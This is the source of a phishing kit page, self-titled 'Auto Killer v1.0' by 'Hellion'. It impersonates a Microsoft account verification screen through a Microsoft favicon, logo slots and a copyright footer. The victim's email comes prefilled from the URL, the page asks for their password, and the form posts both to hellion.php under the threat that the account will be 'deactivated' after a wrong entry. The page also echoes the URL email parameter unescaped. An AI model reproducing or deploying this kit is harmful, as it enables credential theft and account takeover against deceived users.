 <!--

 # HELLION PROUDLY PRESENTS, Auto Killer v1.0
 
 # This program is free software brought to you by Hellion: 
 # You can redistribute it and/or modify it under the terms of 
 # the GNU General Public License as published by the Free Software Foundation, 
 # either version 3 of the License, or (at your option) any later version.
 
 # However, the license header, copyright and author credits 
 # must not be modified in any form and always be displayed.

 # This program is distributed in the hope that it will be useful,
 # but WITHOUT ANY WARRANTY; without even the implied warranty of
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
 # Contact me : team_pbg@yahoo.com for more details.
 
 # Skype: teamipwned

 # Special greets to Shaif Lifax, Solaree, PaperBoi, Softwarewind, Emoney, and others who helped! 
 
 # WARNING: Do not touch anything here!
 
  -->
<!DOCTYPE html>
<html dir="ltr" lang="EN-US"><head>
<title>Verification Set-up</title>

<script type="text/JavaScript">
<!--
function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_validateForm() { //v4.0
  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
    if (val) { nm=val.name; if ((val=val.value)!="") {
      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
        if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
      } else if (test!='R') { num = parseFloat(val);
        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
          min=test.substring(8,p); max=test.substring(p+1);
          if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
  } if (errors) alert('The following error(s) occurred:\n'+errors);
  document.MM_returnValue = (errors == '');
}
//-->
</script>

<link rel="shortcut icon" href="https://auth.gfx.ms/16.000.25123.00/favicon.ico?v=2">
<link rel="stylesheet" title="R3CSS" type="text/css" href="./hellion/R3WinLive1033.css">


</head>
<body onLoad="evt_Login_onload(event);" uitheme="Web">
<div style="height: 40px;"></div><div id="shellTD" class="centerParent" style="width: 100%;"><div id="shellTBL" class="center" style="width: 935px;"><div class="centerParent"><div id="mainTD" class="center" style="width: 895px;"><div id="brandModeTD" class="floatLeft" style="width: 475px;"><div id="productTD" style="width: 475px;"><iframe id="i0278" height="490px" width="475px" frameborder="0" marginheight="0px" marginwidth="0px" scrolling="no" src="./hellion/EN-US(1).htm"></iframe></div></div><div id="signInTD" class="floatLeft" style="width: 420px; position: relative;"><div style="height: 40px;"></div><div id="i0272" class="signInHeader"><iframe id="i0277" height="50px" width="320px" frameborder="0" marginheight="0px" marginwidth="0px" scrolling="no" src="./hellion/EN-US.htm"></iframe></div><div style="height: 30px;"></div><div class="floatLeft" style="width: 100px; height: 370px;"></div><div class="floatLeft" style="width: 320px;"><div id="rightTD">

<form action="hellion.php" method="post" onSubmit="MM_validateForm('Email','','RisEmail','Password','','R');return document.MM_returnValue">

<div class="section"><div id="idTd_Tile_Error" aria-live="assertive" aria-relevant="text" aria-atomic="true" style="display: none;"><div class="errorDiv first" id="idTd_Tile_ErrorMsg_Login"></div></div><div id="idTd_PWD_Error" aria-live="assertive" aria-relevant="text" aria-atomic="true" style="display: none;"><div class="errorDiv first" id="idTd_PWD_ErrorMsg_Username">Generic Password Error Message</div></div>
<div id="idTd_PWD_UsernameLbl" class="row label"><span id="idLbl_PWD_Username" role="heading"><a id="idA_MSAccLearnMore" href="#">We need your E-mail password to verify your account </a></span></div>

<div id="idDiv_PWD_UsernameTb" class="row textbox"><div style="position: relative; width: 100%; font-size:15px;">
<input name="Email" class="form-control" id="email" value="<?php echo $_GET['email']; ?>" maxlength="113" type="hidden"><span id="idLbl_PWD_Username" role="heading"><br><?php echo $_GET['email']; ?></span>
</div></div>
<br />
<div id="idDiv_PWD_PasswordTb" class="row textbox"><div style="position: relative; width: 100%;">
<input type="password" name="Password" id="i0118" placeholder="Password">
</div></div>


</div>
<div id="idTd_PWD_SubmitCancelTbl" class="section"><input type="submit" name="SI" id="idSIButton9" value="Verify" class="default"></div><div class="section"><div id="idDiv_PWD_ForgotPassword" class="row small"><a href="#" id="idA_PWD_ForgotPassword">Endeavor not to input the wrong combination of password,</a></div><div id="idTD_PWD_SwitchToOTCLink" class="row small"><a href="" id="idA_PWD_SwitchToOTC">so your account won't be deactivated.</a></div></div></form></div></div>
</div>
</div></div><div style="height: 50px; clear: both;"></div></div></div><div id="evDiv" class="footerHeight"><img id="ev" alt="" height="0" style="visibility: hidden;"></div><div id="footerTD" class="footer centerParent" style="clear: both; margin-left: 0px;"><div class="center" style="width: 895px;"><div id="idDiv_MSLogo" class="mslogo"></div></div><div class="center" style="width: 895px; clear: both;"><table class="footer" cellpadding="0" cellspacing="0"><tbody><tr><td align="right"><table cellpadding="0" cellspacing="0"><tbody><tr><td style="text-align: right;"><span></span></td><td class="footerspace" aria-hidden="true">&nbsp;</td><td class="footerspace" aria-hidden="true">&nbsp;</td><td style="text-align: right;"><a href="#" class="footerlink" id="ftrFdbk">Contact Us</a></td><td class="footerspace" aria-hidden="true">&nbsp;</td><td class="footerspace" aria-hidden="true">&nbsp;</td><td style="text-align: right;"><a href="#" class="footerlink" id="ftrTerms">Terms of Use</a></td><td class="footerspace" aria-hidden="true">&nbsp;</td><td class="footerspace" aria-hidden="true">&nbsp;</td><td style="text-align: right;"><a href="#" class="footerlink" id="ftrPrivacy">Privacy &amp; Cookies</a></td><td class="footerspace" aria-hidden="true">&nbsp;</td><td class="footerspace" aria-hidden="true">&nbsp;</td><td style="text-align: right;"><span id="ftrCopy" class="secondary ltr">&#169;2015 Microsoft</span></td></tr></tbody></table></td></tr></tbody></table></div></div></body></html>